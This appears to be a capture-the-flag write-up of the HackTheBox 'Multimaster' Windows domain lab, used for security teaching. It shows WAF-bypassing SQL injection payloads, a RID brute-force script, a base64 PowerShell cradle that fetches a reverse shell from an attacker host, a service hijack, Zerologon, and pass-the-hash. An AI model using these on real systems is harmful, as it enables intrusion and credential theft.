---
title: "Multimaster HackTheBox" 
date: 2026-05-11 5:00:00 0000+
tags: [WriteUp, Multimaster, HTB, Enumeration, Active Directory, Rusthound-CE, SQL Injection, SQLmap, MSSQL, Bloodhound, tamperscript, unicode_escape, ServerOperators, RID Bruteforcing, python, scripting, Service Abuse, Service Binary, WAF Bypass, BackupOperators, CEF Debug, Password Spraying, WebSockets, PTH, Privilege Escalation, strings, .dll abuse, targeted kerberoasting, CVE, hashcat, ZeroLogon, CVE-2020-1472, secretsdump-py, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Multimaster_HTB/image%201.png
---
# Multimaster HackTheBox

`Multimaster` is an insane difficulty Windows machine featuring a web application that is vulnerable to `SQL Injection`. This vulnerability is leveraged to obtain the foothold on the server. Examination the file system reveals that a vulnerable version of VS Code is installed, and VS Code processes and found to be running on the server. By exploiting debug functionality, a shell as the user `cyork` can be gained. A password is found in a DLL, which due to password reuse, results in a shell as `sbauer`. This user is found to have `GenericWrite` permissions on the user `jorden`. Abusing this privilege allows us to gain access to the server as this user. `jorden` is be member of `Server Operators` group, whose privileges we exploit to get a `SYSTEM` shell.

![image.png](/assets/images/Multimaster_HTB/image.png)


## Initial Foothold

### Rustscan

We start off with rustscan to find open ports and services running on the box.

```bash
rustscan -a 10.129.95.200 -r 1-65535 -- -sC -sV -vv 10.129.95.200
```

![image.png](/assets/images/Multimaster_HTB/image%202.png)

![image.png](/assets/images/Multimaster_HTB/image%203.png)

We identified it is an active directory environment with the domain name registered as megacorp.local and the DC is `multimaster`, so the FQDN be `MULTIMASTER.MEGACORP.LOCAL`

There is also a webserver running on port 80.

### Web Enumeration

Visiting the webpage on port 80 we have this page.

![image.png](/assets/images/Multimaster_HTB/image%204.png)

We have a login page also, but that feature doesn't work!

So moving forward with the web enumeration.

The most important part in the whole website is the colleague finder one since it searches all the colleagues of the domain.

![image.png](/assets/images/Multimaster_HTB/image%205.png)

This page denies wild card characters.

So I captured the request in burp for manual enumeration.

![image.png](/assets/images/Multimaster_HTB/image%206.png)

Now I saved this request to a file and sent it to `sqlmap` to find any SQLI present in the page.

```bash
sqlmap -r name.req --tamper=space2comment --batch --level 3 --risk 3
```

I ran into `WAF` that protects the web app.

![image.png](/assets/images/Multimaster_HTB/image%207.png)

### WFUZZ (Identify Bad Characters)

Lets use `wfuzz` to find the bad characters which are not allowed.

```bash
wfuzz -u http://10.129.95.200/api/getColleagues -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -d '{"name"="FUZZ"}' -c -s 3
```

![image.png](/assets/images/Multimaster_HTB/image%208.png)

As we can see in the above page that we got forbidden (code 403) after some of the code 415’s, this is because WAF is protecting the page.

Also `#` and `‘` are blocked rest else are allowed.

We need to figure out a way to bypass WAF.

One thing identified with burp is that it processes unicode characters.

![image.png](/assets/images/Multimaster_HTB/image%209.png)

But is not returning any colleagues in the output.

### SQLMAP (tamper script charunicodeescape)

There is tamper script in the sqlmap suite known as [charunicodeescape.py](http://charunicodeescape.py) 

![image.png](/assets/images/Multimaster_HTB/image%2010.png)

Lets run sqlmap on our request with this script.

```bash
sqlmap -r name.req --tamper=charunicodeescape --batch --level 5 --risk 3 --delay 5
```

![image.png](/assets/images/Multimaster_HTB/image%2011.png)

![image.png](/assets/images/Multimaster_HTB/image%2012.png)

It identified the injection for us now lets try to retrieve the databases.

```bash
sqlmap -r name.req --tamper=charunicodeescape --batch --level 5 --risk 3 --delay 5 --dbs
```

![image.png](/assets/images/Multimaster_HTB/image%2013.png)

Lets retrieve tables from `Hub_DB` database.

```bash
sqlmap -r name.req --tamper=charunicodeescape --batch --level 5 --risk 3 --delay 5 -D Hub_DB --tables
```

![image.png](/assets/images/Multimaster_HTB/image%2014.png)

Dumping these both tables.

```bash
sqlmap -r name.req --tamper=charunicodeescape --batch --level 5 --risk 3 --delay 5 -D Hub_DB -T Colleagues --dump
```

![image.png](/assets/images/Multimaster_HTB/image%2015.png)

Dumping the logins table

```bash
sqlmap -r name.req --tamper=charunicodeescape --batch --level 5 --risk 3 --delay 5 -D Hub_DB -T Logins --dump
```

![image.png](/assets/images/Multimaster_HTB/image%2016.png)

Now we have all the hashes for the users.

Lets try to crack them using hashcat.

### Hash Cracking

Using hashcat to crack these hashes.

![image.png](/assets/images/Multimaster_HTB/image%2017.png)

None of the hashes cracked when used 10800 mode SHA2-384 for cracking.

So used `Keccak-384` to crack them.

```bash
hashcat -m 17900 --user hashes.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Multimaster_HTB/image%2018.png)

It cracked 3 of them.

### Kerbrute

Lets now validate the users across the domain.

```bash
kerbrute userenum -d megacorp.local --dc 10.129.95.200 users.txt
```

![image.png](/assets/images/Multimaster_HTB/image%2019.png)

### Password Spray

Lets test these users with the cracked hashes using Netexec.

```bash
nxc smb 10.129.95.200 -u users.txt  -p creds.txt --continue-on-success
```

![image.png](/assets/images/Multimaster_HTB/image%2020.png)

None of the passwords matched.

### RID Bruteforcing SQLI (Manual Python Script)

Now we need to find a way to extract domain users, since MSSQL is running on the box but is not exposed to us.

We only have one option to get the domain users by `RID Bruteforcing` using SQLI which is nicely explained in this article.

[https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)

Also lets first get our SQLI union injection to work successfully.

![image.png](/assets/images/Multimaster_HTB/image%2021.png)

The above payload is working correctly.

Also we know that it accepts unicode characters and we have a successful SQLI.

This gets blocked, well obviously since its not encoded.

![image.png](/assets/images/Multimaster_HTB/image%2022.png)

So lets encode these characters and then do our UNION injection.

![image.png](/assets/images/Multimaster_HTB/image%2023.png)

Here what I did is used this payload

```bash
a' union select 1,2,3,4,5-- -
a\u0027 uni\u006fn se\u006cect 1,2,3,4,5\u002d\u002d \u002d
```

What it does is now we are in control of the fields.

Lets get the `DEFAULT_DOMAIN()`

![image.png](/assets/images/Multimaster_HTB/image%2024.png)

So now lets try to get the SIDs for the objects in the Domain.

I am gonna be using this payload

```bash
a' union select 1,2,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Administrator')),4,5-- -
```

Then UNICODE encode it fully using cyberchef.

![image.png](/assets/images/Multimaster_HTB/image%2025.png)

![image.png](/assets/images/Multimaster_HTB/image%2026.png)

We got the SUSER SID now need to convert it to RID, so wrote this simple python script.

```python
sid_hex = '0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000'
hex_bytes = bytes.fromhex(sid_hex[2:])
import struct
rid = struct.unpack('<I', hex_bytes[-4:])[0]
print(f'RID: {rid}')

# Full SID reconstruction
sub_count = hex_bytes[1]
auth = int.from_bytes(hex_bytes[2:8], 'big')
subs = [struct.unpack('<I', hex_bytes[8+i*4:12+i*4])[0] for i in range(sub_count)]
print(f'Full SID: S-1-{auth}-{"-".join(map(str,subs))}')
```

This returns.

![image.png](/assets/images/Multimaster_HTB/image%2027.png)

500 confirms that it is Administrator.

So in the SID part `0x0105000000000005150000001c00d1bcd181f1492bdfc236` is the domain and `f4010000` represents the user Administrator.

So let me write a python script to find the rids of domain users.

This is a basic script to get the data using SQLI.

```python
import requests
import json
import binascii
import sys
import struct
import time
endpoint = "http://10.129.95.200/api/getColleagues"
ct = {"Content-Type":"application/json;charset=UTF-8"}
payload_str = "a' union select 1,2,3,4,5-- -"

unicode_encoded = "".join([r"\u{:04x}".format(ord(c)) for c in payload_str])

payload = '{"name":"' + unicode_encoded + '"}'

req = requests.post(endpoint,data=payload,headers=ct)

print(req.text)
```

This returns

![image.png](/assets/images/Multimaster_HTB/image%2028.png)

Lets get the `SUSER_SID` of Administrator using the script.

```python
import requests
import json
import binascii
import sys
import struct
import time
endpoint = "http://10.129.95.200/api/getColleagues"
ct = {"Content-Type":"application/json;charset=UTF-8"}
payload_str = "a' union select 1,2,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\\guest')),4,5-- -"
unicode_encoded = "".join([r"\u{:04x}".format(ord(c)) for c in payload_str])
payload = '{"name":"' + unicode_encoded + '"}'
req = requests.post(endpoint,data=payload,headers=ct)
print(req.text)
```

![image.png](/assets/images/Multimaster_HTB/image%2029.png)

The final script should look like this

```python
import requests
import json
import binascii
import sys
import struct
import time
import struct

domain_sid = bytes.fromhex('0105000000000005150000001c00d1bcd181f1492bdfc236')

endpoint = "http://10.129.95.200/api/getColleagues"
ct = {"Content-Type":"application/json;charset=UTF-8"}

for rid in range(500, 5000):

  try:
    rid_bytes = struct.pack('<I', rid)
    full_sid = domain_sid + rid_bytes
    hex_sid = '0x' + full_sid.hex()
    
    payload_str = f"a' union select 1,2,SUSER_SNAME({hex_sid}),4,5-- -"
    unicode_encoded = "".join([r"\u{:04x}".format(ord(c)) for c in payload_str])
    payload = '{"name":"' + unicode_encoded + '"}'

    req = requests.post(endpoint,data=payload,headers=ct)
    
    data_parse = json.loads(req.text)
    extract_pos = data_parse[0]['position']

    if extract_pos:
      print(f"[+] RID {rid}: {extract_pos}")
    else:
      print(f"[-] RID {rid}: empty", end='\r')
    
  except:
    time.sleep(10)
```

![image.png](/assets/images/Multimaster_HTB/image%2030.png)

Basically what its doing is getting all the usernames from the megacorp domain based upon the SID is being passed to the SUSER_SNAME() function.

And the whole process is automated and if `WAF` triggers it sleeps for 10 seconds and then tries the next SID.

Since the script is taking much longer time I changed the RID parameters starting from 500 to 1000 and reran the script.

![image.png](/assets/images/Multimaster_HTB/image%2031.png)

Found some more added them to users.txt

With that we now have some of the domain users, I will save them to a users.txt file and now we test those passwords across these domain users (letting the script run in the background)

```bash
nxc smb 10.129.95.200 -u users.txt  -p creds.txt --continue-on-success | grep "[+]"
```

![image.png](/assets/images/Multimaster_HTB/image%2032.png)

### Authentication as Tushikikatomo

We have authentication as `Tushikikatomo` user lets enumerate shares with this user.

```bash
nxc smb 10.129.95.200 -u tushikikatomo -p finance1 --shares
```

![image.png](/assets/images/Multimaster_HTB/image%2033.png)

We have a `dfs` share, lets see whats there using smbclient.

![image.png](/assets/images/Multimaster_HTB/image%2034.png)

Unknown error occurred.

Lets check for winrm access.

```bash
nxc winrm 10.129.95.200 -u tushikikatomo -p finance1
```

![image.png](/assets/images/Multimaster_HTB/image%2035.png)

Lets login as tushikikatomo

```bash
evil-winrm-py -i 10.129.95.200 -u tushikikatomo -p finance1
```

![image.png](/assets/images/Multimaster_HTB/image%2036.png)

Claiming the `user.txt` and moving forward with the privilege escalation.

## Privilege Escalation

### Bloodhound

Lets gather bloodhound data using `rusthound`.

```bash
rusthound -d megacorp.local -u 'tushikikatomo' -p 'finance1' -i 10.129.95.200 -f 'multimaster.megacorp.local' -z
```

![image.png](/assets/images/Multimaster_HTB/image%2037.png)

![image.png](/assets/images/Multimaster_HTB/image%2038.png)

There were no outbounds present with our compromised user so looking in the box only for the clues.

### MS VSCode and Studio Port Debugging

In the program data directory there were 2 folders that appear to be odd MS VS CODE and MS VISUAL STUDIO.

![image.png](/assets/images/Multimaster_HTB/image%2039.png)

Listing all the processes we have this

![image.png](/assets/images/Multimaster_HTB/image%2040.png)

Also the Visual Studio code is running and have some ports open.

![image.png](/assets/images/Multimaster_HTB/image%2041.png)

To debug these ports whats running on them we have a tool called CEFDebugger.

[https://github.com/taviso/cefdebug/releases/tag/v0.2](https://github.com/taviso/cefdebug/releases/tag/v0.2)

### Authentication as Cyork

Running the CEF debugger.

```bash
.\cefdebug.exe
```

![image.png](/assets/images/Multimaster_HTB/image%2042.png)

So I created a powershell cradle.

![image.png](/assets/images/Multimaster_HTB/image%2043.png)

```bash
.\cefdebug --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACA
ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANgA6ADkAMAA5ADAALwBzAGgAZQBsA
GwALgBwAHMAMQAnACkA')" --url ws://127.0.0.1:18116/cb0a076a-f9f0-4481-8822-966743629b5d
```

Send the full command using encrypted powershell and got the reverse shell connection back to me on port 9004.

![image.png](/assets/images/Multimaster_HTB/image%2044.png)

Now we are `cyork.`

Now lets check that weather we have access to the webserver directory or not.

Trying to list files in the webserver root.

![image.png](/assets/images/Multimaster_HTB/image%2045.png)

`MultimasterAPI.dll` caught my attention, since its a custom dll created by a user and generally is not present on the webserver directories.

Copied the .dll using the smbserver.

So lets run strings on the .dll

```bash
strings -e l MultimasterAPI.dll
```

`Running the strings with 16 bits (-e l) option we get some creds.`

![image.png](/assets/images/Multimaster_HTB/image%2046.png)

### Authentication as Sbauer

So lets run this password across the domain with all the users.

```bash
nxc smb 10.129.95.200 -u users.txt  -p 'D3veL0pM3nT!'
```

![image.png](/assets/images/Multimaster_HTB/image%2047.png)

We got a hit as `sbauer`. Marking them as owned in bloodhound.

Also checking the outbounds from the user sbauer.

![image.png](/assets/images/Multimaster_HTB/image%2048.png)

### Authentication as Jorden

We have genericWrite over Jorden as `sbauer` lets use `targetedkerberoast.py` to exploit this and get the crackable hash for `jorden` user.

```bash
faketime -f "+10m" python3 /opt/targetedKerberoast/targetedKerberoast.py -u 'sbauer' -p 'D3veL0pM3nT!' -d megacorp.local --dc-ip 10.129.95.200
```

![image.png](/assets/images/Multimaster_HTB/image%2049.png)

Cracking this hash using hashcat.

```bash
hashcat -m 13100 jordenhash.txt /usr/share/wordlists/rockyou.txt
```

![image.png](/assets/images/Multimaster_HTB/image%2050.png)

Lets validate this password.

```bash
nxc winrm megacorp.local -u jorden -p rainforest786 --shares
```

![image.png](/assets/images/Multimaster_HTB/image%2051.png)

Also this user is a member of server operators.

![image.png](/assets/images/Multimaster_HTB/image%2052.png)

We have `SeBackupPrivilege`.

So copying the sam and system to our local machine and trying to dump the hashes.

![image.png](/assets/images/Multimaster_HTB/image%2053.png)

Running secretsdump.py reveals the hashes but was incorrect.

![image.png](/assets/images/Multimaster_HTB/image%2054.png)

Since `jorden` is a member of `server operators` 

Members of this group have the permissions to modify services , start and stop them.

### Service Abuse as Jorden

Running `Winpeas.exe` on the box.

And we can see that we have a lot of services in which we have write access to.

![image.png](/assets/images/Multimaster_HTB/image%2055.png)

Lets modify `UsoSvc`. Since this is the most common service and easily exploitable too.

![image.png](/assets/images/Multimaster_HTB/image%2056.png)

Modifying the path of the service.

```bash
sc.exe config UsoSvc binpath="C:\Windows\System32\cmd.exe /c net localgroup administrators jorden /add"
```

![image.png](/assets/images/Multimaster_HTB/image%2057.png)

Logging out and reconnecting with winrm to get a new token as an local administrator.

![image.png](/assets/images/Multimaster_HTB/image%2058.png)

We are now the local administrator.

Lets now read the root.txt from the administrator desktop.

![image.png](/assets/images/Multimaster_HTB/image%2059.png)

Rooted!

There is also another way of rooting this box using the `Zerologon vulnerability` which is a unintended path.

Please read below!

## Unintended Way

### Zerologon (Windows server 2016)

```bash
nxc smb 10.129.95.200 -u tushikikatomo -p finance1 -M zerologon
```

![image.png](/assets/images/Multimaster_HTB/image%2060.png)

Cloning the repo and running the exploit.

[https://github.com/dirkjanm/cve-2020-1472](https://github.com/dirkjanm/cve-2020-1472)

```bash
python3 cve-2020-1472-exploit.py 'multimaster$' 10.129.95.200
```

![image.png](/assets/images/Multimaster_HTB/image%2061.png)

Now lets run `secretsdump` and dump the full domain.
This hash `31D6CFE0D16AE931B73C59D7E0C089C0` represents an empty password hash, and since we set the DC's password to empty string it works with secretsdump.py to dump the full domain.

```bash
secretsdump.py megacorp.local/'multimaster$'@multimaster.megacorp.local -hashes ':31D6CFE0D16AE931B73C59D7E0C089C0'
```

![image.png](/assets/images/Multimaster_HTB/image%2062.png)

![image.png](/assets/images/Multimaster_HTB/image%2063.png)

![image.png](/assets/images/Multimaster_HTB/image%2064.png)

Lets authenticate.

```bash
nxc smb megacorp.local -u Administrator -H 69cbf4a9b7415c9e1caf93d51d971be0
```

![image.png](/assets/images/Multimaster_HTB/image%2065.png)

Using `psexec.py` to login.

```bash
psexec.py  -hashes :69cbf4a9b7415c9e1caf93d51d971be0 megacorp.local/Administrator@10.129.95.200
```

![image.png](/assets/images/Multimaster_HTB/image%2066.png)

Rooted!

![image.png](/assets/images/Multimaster_HTB/image%2067.png)

Thanks for Reading 😄
